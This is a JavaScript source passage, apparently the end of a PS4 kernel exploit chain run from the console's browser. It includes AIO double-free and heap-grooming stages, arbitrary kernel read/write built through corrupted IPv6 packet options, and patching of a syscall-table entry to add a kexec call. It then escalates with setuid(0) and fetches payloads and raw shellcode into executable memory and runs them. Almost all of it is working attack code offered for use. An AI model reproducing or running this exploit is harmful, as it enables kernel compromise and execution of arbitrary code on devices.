  const read_buf = new Buffer(8);
  const read_buf_p = read_buf.addr;
  function kread64(addr) {
    const len = 8;
    let offset = 0;
    while (offset < len) {
      pktinfo.write64(8, addr.add(offset));
      nhop[0] = len - offset;

      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
      sysi("getsockopt", psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf_p.add(offset), nhop_p);

      const n = nhop[0];
      if (n === 0) {
        read_buf[offset] = 0;
        offset += 1;
      } else {
        offset += n;
      }
    }
    return read_buf.read64(0);
  }

  log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
  const kstr = jstr(read_buf);
  log(`*(&"evf cv"): ${kstr}`);
  if (kstr !== "evf cv") {
    die('test read of &"evf cv" failed');
  }

  const kbase = kernel_addr.sub(off_kstr);
  log(`kernel base: ${kbase}`);

  log("\nmaking arbitrary kernel read/write");
  const cpuid = 7 - main_core;
  const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
  log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
  const pcpu = kread64(pcpu_p);
  log(`pcpu: ${pcpu}`);
  log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
  const td = kread64(pcpu);
  log(`td: ${td}`);

  const off_td_proc = 8;
  const proc = kread64(td.add(off_td_proc));
  log(`proc: ${proc}`);
  const pid = sysi("getpid");
  log(`our pid: ${pid}`);
  const pid2 = kread64(proc.add(0xb0)).lo;
  log(`suspected proc pid: ${pid2}`);
  if (pid2 !== pid) {
    die("process not found");
  }

  const off_p_fd = 0x48;
  const p_fd = kread64(proc.add(off_p_fd));
  log(`proc.p_fd: ${p_fd}`);
  const ofiles = kread64(p_fd);
  log(`ofiles: ${ofiles}`);

  const off_p_ucred = 0x40;
  const p_ucred = kread64(proc.add(off_p_ucred));
  log(`p_ucred ${p_ucred}`);

  const pipes = new View4(2);
  sysi("pipe", pipes.addr);
  const pipe_file = kread64(ofiles.add(pipes[0] * 8));
  log(`pipe file: ${pipe_file}`);
  const kpipe = kread64(pipe_file);
  log(`pipe pointer: ${kpipe}`);

  const pipe_save = new Buffer(0x18);
  for (let off = 0; off < pipe_save.size; off += 8) {
    pipe_save.write64(off, kread64(kpipe.add(off)));
  }

  const main_sd = psd;
  const worker_sd = dirty_sd;

  const main_file = kread64(ofiles.add(main_sd * 8));
  log(`main sock file: ${main_file}`);
  const main_sock = kread64(main_file);
  log(`main sock pointer: ${main_sock}`);
  const m_pcb = kread64(main_sock.add(0x18));
  log(`main sock pcb: ${m_pcb}`);
  const m_pktopts = kread64(m_pcb.add(0x118));
  log(`main pktopts: ${m_pktopts}`);
  log(`0x100 malloc zone pointer: ${k100_addr}`);

  if (m_pktopts.ne(k100_addr)) {
    die("main pktopts pointer != leaked pktopts pointer");
  }

  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
  log(`reclaim sock pointer: ${reclaim_sock}`);
  const r_pcb = kread64(reclaim_sock.add(0x18));
  log(`reclaim sock pcb: ${r_pcb}`);
  const r_pktopts = kread64(r_pcb.add(0x118));
  log(`reclaim pktopts: ${r_pktopts}`);

  const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
  log(`worker sock pointer: ${worker_sock}`);
  const w_pcb = kread64(worker_sock.add(0x18));
  log(`worker sock pcb: ${w_pcb}`);
  const w_pktopts = kread64(w_pcb.add(0x118));
  log(`worker pktopts: ${w_pktopts}`);

  const w_pktinfo = w_pktopts.add(0x10);
  pktinfo.write64(0, w_pktinfo);
  pktinfo.write64(8, 0);
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);

  pktinfo.write64(0, kernel_addr);
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  const kstr2 = jstr(pktinfo);
  log(`*(&"evf cv"): ${kstr2}`);
  if (kstr2 !== "evf cv") {
    die("pktopts read failed");
  }
  log("achieved restricted kernel read/write");

  class KernelMemory {
    constructor(main_sd, worker_sd, pipes, pipe_addr) {
      this.main_sd = main_sd;
      this.worker_sd = worker_sd;
      this.rpipe = pipes[0];
      this.wpipe = pipes[1];
      this.pipe_addr = pipe_addr;
      this.pipe_addr2 = pipe_addr.add(0x10);
      this.rw_buf = new Buffer(0x14);
      this.addr_buf = new Buffer(0x14);
      this.data_buf = new Buffer(0x14);
      this.data_buf.write32(0xc, 0x40000000);
    }

    _verify_len(len) {
      if (!(Number.isInteger(len) && 0 <= len <= 0xffffffff)) {
        throw TypeError("len not a 32-bit unsigned integer");
      }
    }

    copyin(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;

      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

      data_buf.write64(0, 0);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);

      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

      addr_buf.write64(0, dst);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

      sysi("write", this.wpipe, src, len);
    }

    copyout(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;

      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

      data_buf.write32(0, 0x40000000);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);

      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

      addr_buf.write64(0, src);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

      sysi("read", this.rpipe, dst, len);
    }

    _read(addr) {
      const buf = this.rw_buf;
      buf.write64(0, addr);
      buf.fill(0, 8);
      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
    }

    read8(addr) {
      this._read(addr);
      return this.rw_buf.read8(0);
    }

    read16(addr) {
      this._read(addr);
      return this.rw_buf.read16(0);
    }

    read32(addr) {
      this._read(addr);
      return this.rw_buf.read32(0);
    }

    read64(addr) {
      this._read(addr);
      return this.rw_buf.read64(0);
    }

    write8(addr, value) {
      this.rw_buf.write8(0, value);
      this.copyin(this.rw_buf.addr, addr, 1);
    }

    write16(addr, value) {
      this.rw_buf.write16(0, value);
      this.copyin(this.rw_buf.addr, addr, 2);
    }

    write32(addr, value) {
      this.rw_buf.write32(0, value);
      this.copyin(this.rw_buf.addr, addr, 4);
    }

    write64(addr, value) {
      this.rw_buf.write64(0, value);
      this.copyin(this.rw_buf.addr, addr, 8);
    }
  }
  const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);

  const kstr3_buf = new Buffer(8);
  kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
  const kstr3 = jstr(kstr3_buf);
  log(`*(&"evf cv"): ${kstr3}`);
  if (kstr3 !== "evf cv") {
    die("pipe read failed");
  }
  log("achieved arbitrary kernel read/write");

  const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
  const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
  const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
  kmem.write64(r_rthdr_p, 0);
  kmem.write64(w_rthdr_p, 0);
  log("corrupt pointers cleaned");

  return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
}

async function get_binary(url) {
  const response = await fetch(url);
  if (!response.ok) {
    throw Error(`network response was not OK, status: ${response.status}\nfailed to fetch: ${url}`);
  }
  return response.arrayBuffer();
}

async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
  if (!is_ps4) {
    throw RangeError("ps5 kernel patching unsupported");
  }
  // if (!(0x700 <= version && version < 0x1000)) {
	if (!(0x800 <= version && version < 0x1000)) {
    throw RangeError("kernel patching unsupported");
  }

  log("change sys_aio_submit() to sys_kexec()");
  const sysent_661 = kbase.add(off_sysent_661);
  const sysent_661_save = new Buffer(0x30);
  for (let off = 0; off < sysent_661_save.size; off += 8) {
    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
  }
  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
  log("sysent[611] save data:");
  hexdump(sysent_661_save);
  kmem.write32(sysent_661, 6);
  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
  kmem.write32(sysent_661.add(0x2c), 1);

  log("set the bits for JIT privs");
  kmem.write64(p_ucred.add(0x60), -1);
  kmem.write64(p_ucred.add(0x68), -1);

  const buf = await get_binary(patch_elf_loc);
  const patches = new View1(buf);
  let map_size = patches.size;
  const max_size = 0x10000000;
  if (map_size > max_size) {
    die(`patch file too large (>${max_size}): ${map_size}`);
  }
  if (map_size === 0) {
    die("patch file size is zero");
  }
  log(`kpatch size: ${map_size} bytes`);
  map_size = (map_size + page_size) & -page_size;

  const prot_rw = 3;
  const prot_rx = 5;
  const prot_rwx = 7;
  const exec_p = new Int(0, 9);
  const write_p = new Int(max_size, 9);

  log("open JIT fds");
  const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
  const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);

  log("mmap for kpatch shellcode");
  const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
  const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);

  log(`exec_addr: ${exec_addr}`);
  log(`write_addr: ${write_addr}`);
  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
    die("mmap() for jit failed");
  }

  log("mlock exec_addr for kernel exec");
  sysi("mlock", exec_addr, map_size);

  const test_code = new Int(0x001337b8, 0xc300);
  write_addr.write64(0, test_code);

  log("test jit exec");
  sys_void("kexec", exec_addr);
  let retval = chain.errno;
  log("returned successfully");

  log(`jit retval: ${retval}`);
  if (retval !== 0x1337) {
    die("test jit exec failed");
  }

  log("mlock saved data for kernel restore");
  const pipe_save = restore_info[1];
  restore_info[1] = pipe_save.addr;
  sysi("mlock", restore_info[1], page_size);
  restore_info[4] = sysent_661_save.addr;
  sysi("mlock", restore_info[4], page_size);

  log("execute kpatch...");
  mem.cpy(write_addr, patches.addr, patches.size);
  sys_void("kexec", exec_addr, ...restore_info);
}

function setup(block_fd) {
  log("block AIO");
  const reqs1 = new Buffer(0x28 * num_workers);
  const block_id = new Word();

  for (let i = 0; i < num_workers; i++) {
    reqs1.write32(8 + i * 0x28, 1);
    reqs1.write32(0x20 + i * 0x28, block_fd);
  }
  aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);

  log("heap grooming");
  const num_reqs = 3;
  const groom_ids = new View4(num_grooms);
  const groom_ids_p = groom_ids.addr;
  const greqs = make_reqs1(num_reqs);
  spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
  cancel_aios(groom_ids_p, num_grooms);
  return [block_id, groom_ids];
}

export async function kexploit() {
  const _init_t1 = performance.now();
  await init();
  const _init_t2 = performance.now();

  try {
    if (sysi("setuid", 0) == 0) {
      log("kernel already patched, skipping kexploit");
      return true;
    }
  } catch {
    // Expected when not in an exploited state
  }

  // Get current core/rtprio
  const current_core = get_current_core();
  const current_rtprio = get_current_rtprio();
  log(`current core: ${current_core}`);
  log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);

  const main_mask = new Buffer(sizeof_cpuset_t_);
  get_cpu_affinity(main_mask);
  log(`main_mask: ${main_mask}`);

  log(`pinning process to core #${main_core}`);
  pin_to_core(main_core);
  get_cpu_affinity(main_mask);
  log(`main_mask: ${main_mask}`);

  log("setting main thread's priority");
  set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });

  const [block_fd, unblock_fd] = (() => {
    const unix_pair = new View4(2);
    sysi("socketpair", AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
    return unix_pair;
  })();

  const sds = [];
  for (let i = 0; i < num_sds; i++) {
    sds.push(new_socket());
  }

  let block_id = null;
  let groom_ids = null;
  try {
    log("STAGE: Setup");
    [block_id, groom_ids] = setup(block_fd);

    log("\nSTAGE: Double free AIO queue entry");
    const sd_pair = double_free_reqs2(sds);

    log("\nSTAGE: Leak kernel addresses");
    const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair);

    log("\nSTAGE: Double free SceKernelAioRWRequest");
    const [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds);

    log("\nSTAGE: Get arbitrary kernel read/write");
    const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);

    log("\nSTAGE: Patch kernel");
    await patch_kernel(kbase, kmem, p_ucred, restore_info);
  } finally {
    if (unblock_fd !== undefined && unblock_fd !== null) {
      close(unblock_fd);
    }

    const t2 = performance.now();
    const ftime = t2 - t1;
    const init_time = _init_t2 - _init_t1;
    log(`\ntime (include init): ${ftime / 1000}`);
    log(`kex time: ${(t2 - _init_t2) / 1000}`);
    log(`init time: ${init_time / 1000}`);
    log(`time to init: ${(_init_t1 - t1) / 1000}`);
    log(`time - init time: ${(ftime - init_time) / 1000}`);
  }
  if (block_fd !== undefined && block_fd !== null) {
    close(block_fd);
  }
  if (groom_ids) {
    free_aios2(groom_ids.addr, groom_ids.length);
  }
  if (block_id !== null) {
    aio_multi_wait(block_id.addr, 1);
    aio_multi_delete(block_id.addr, block_id.length);
  }
  for (const sd of sds) {
    close(sd);
  }

  // Restore core/rtprio
  log(`restoring core: ${current_core}`);
  log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
  pin_to_core(current_core);
  set_rtprio(current_rtprio);

  log("setuid(0)");
  try {
    if (sysi("setuid", 0) == 0) {
      log("kernel exploit succeeded!");
      return true;
    }
  } catch {
    die("kernel exploit failed!");
  }

  return false;
}

function malloc(sz) {
  const backing = new Uint8Array(0x10000 + sz);
  nogc.push(backing);
  const ptr = mem.readp(mem.addrof(backing).add(0x10));
  ptr.backing = backing;
  return ptr;
}

function malloc32(sz) {
  const backing = new Uint8Array(0x10000 + sz * 4);
  nogc.push(backing);
  const ptr = mem.readp(mem.addrof(backing).add(0x10));
  ptr.backing = new Uint32Array(backing.buffer);
  return ptr;
}

function array_from_address(addr, size) {
  const og_array = new Uint32Array(0x1000);
  const og_array_i = mem.addrof(og_array).add(0x10);
  mem.write64(og_array_i, addr);
  mem.write32(og_array_i.add(0x8), size);
  mem.write32(og_array_i.add(0xc), 1);
  nogc.push(og_array);
  return og_array;
}

function runBinLoader() {
  const payload_buffer = chain.sysp("mmap", 0, 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON, -1, 0);
  const payload_loader = malloc32(0x1000);
  const loader_writer = payload_loader.backing;
  loader_writer[0] = 0x56415741;
  loader_writer[1] = 0x83485541;
  loader_writer[2] = 0x894818ec;
  loader_writer[3] = 0xc748243c;
  loader_writer[4] = 0x10082444;
  loader_writer[5] = 0x483c2302;
  loader_writer[6] = 0x102444c7;
  loader_writer[7] = 0x00000000;
  loader_writer[8] = 0x000002bf;
  loader_writer[9] = 0x0001be00;
  loader_writer[10] = 0xd2310000;
  loader_writer[11] = 0x00009ce8;
  loader_writer[12] = 0xc7894100;
  loader_writer[13] = 0x8d48c789;
  loader_writer[14] = 0xba082474;
  loader_writer[15] = 0x00000010;
  loader_writer[16] = 0x000095e8;
  loader_writer[17] = 0xff894400;
  loader_writer[18] = 0x000001be;
  loader_writer[19] = 0x0095e800;
  loader_writer[20] = 0x89440000;
  loader_writer[21] = 0x31f631ff;
  loader_writer[22] = 0x0062e8d2;
  loader_writer[23] = 0x89410000;
  loader_writer[24] = 0x2c8b4cc6;
  loader_writer[25] = 0x45c64124;
  loader_writer[26] = 0x05ebc300;
  loader_writer[27] = 0x01499848;
  loader_writer[28] = 0xf78944c5;
  loader_writer[29] = 0xbaee894c;
  loader_writer[30] = 0x00001000;
  loader_writer[31] = 0x000025e8;
  loader_writer[32] = 0x7fc08500;
  loader_writer[33] = 0xff8944e7;
  loader_writer[34] = 0x000026e8;
  loader_writer[35] = 0xf7894400;
  loader_writer[36] = 0x00001ee8;
  loader_writer[37] = 0x2414ff00;
  loader_writer[38] = 0x18c48348;
  loader_writer[39] = 0x5e415d41;
  loader_writer[40] = 0x31485f41;
  loader_writer[41] = 0xc748c3c0;
  loader_writer[42] = 0x000003c0;
  loader_writer[43] = 0xca894900;
  loader_writer[44] = 0x48c3050f;
  loader_writer[45] = 0x0006c0c7;
  loader_writer[46] = 0x89490000;
  loader_writer[47] = 0xc3050fca;
  loader_writer[48] = 0x1ec0c748;
  loader_writer[49] = 0x49000000;
  loader_writer[50] = 0x050fca89;
  loader_writer[51] = 0xc0c748c3;
  loader_writer[52] = 0x00000061;
  loader_writer[53] = 0x0fca8949;
  loader_writer[54] = 0xc748c305;
  loader_writer[55] = 0x000068c0;
  loader_writer[56] = 0xca894900;
  loader_writer[57] = 0x48c3050f;
  loader_writer[58] = 0x006ac0c7;
  loader_writer[59] = 0x89490000;
  loader_writer[60] = 0xc3050fca;

  chain.sys("mprotect", payload_loader, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC);
  const pthread = malloc(0x10);

  {
    sysi("mlock", payload_buffer, 0x300000);
    call_nze("pthread_create", pthread, 0, payload_loader, payload_buffer);
  }

  log("awaiting payload...");
}

function runPayload(path) {
  log(`loading ${path}`);
  const xhr = new XMLHttpRequest();
  xhr.open("GET", path);
  xhr.responseType = "arraybuffer";
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        try {
          const padding_length = (4 - (xhr.response.byteLength % 4)) % 4;
          const padded_buffer = new Uint8Array(xhr.response.byteLength + padding_length);
          padded_buffer.set(new Uint8Array(xhr.response), 0);
          if (padding_length) {
            padded_buffer.set(new Uint8Array(padding_length), xhr.response.byteLength);
          }

          const shellcode = new Uint32Array(padded_buffer.buffer);
          const payload_buffer = chain.sysp("mmap", 0, padded_buffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
          log(`payload buffer allocated at ${payload_buffer}`);
          const payload_buffer_shadow = array_from_address(payload_buffer, shellcode.length);
          payload_buffer_shadow.set(shellcode);
          log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding_length} bytes padding)`);
          chain.call_void(payload_buffer);
          sysi("munmap", payload_buffer, padded_buffer.length);
        } catch (e) {
          log(`error in runPayload: ${e.message}`);
        }
      } else {
        log(`error retrieving payload, ${xhr.status}`);
      }
    }
  };
  xhr.onerror = function () {
    log("network error");
  };
  xhr.send();
}

kexploit().then((success) => {
  if (success) {
    const payloadFile = getPayloadFile(version);
    runPayload(`./${payloadFile}`);
  }
});